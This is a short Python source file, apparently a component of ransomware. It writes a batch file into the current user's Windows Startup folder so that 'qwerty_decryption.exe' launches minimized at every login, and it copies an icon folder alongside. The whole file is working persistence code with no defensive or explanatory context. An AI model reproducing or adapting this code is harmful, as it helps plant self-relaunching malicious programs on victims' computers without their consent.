import os
import getpass
import shutil

USER_NAME = getpass.getuser()
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME


def add_to_startup(file_path="qwerty_decryption.exe"):
    file_path = os.path.abspath(file_path)
    file_path = '"' + file_path + '"'
    with open(bat_path + '\\' + 'open.bat', "w+") as bat_file:
        bat_file.write(r'start "" %s /min' % file_path)
    copy_icon_dir()


def copy_icon_dir(folder_from='icon', folder_to=bat_path):
    if os.path.exists(os.path.join(folder_to, folder_from)):
        for f in os.listdir(folder_from):
            shutil.copy(os.path.join(folder_from, f), os.path.join(folder_to, folder_from, f))
    else:
        os.mkdir(os.path.join(folder_to, folder_from))
        for f in os.listdir(folder_from):
            shutil.copy(os.path.join(folder_from, f), os.path.join(folder_to, folder_from, f))
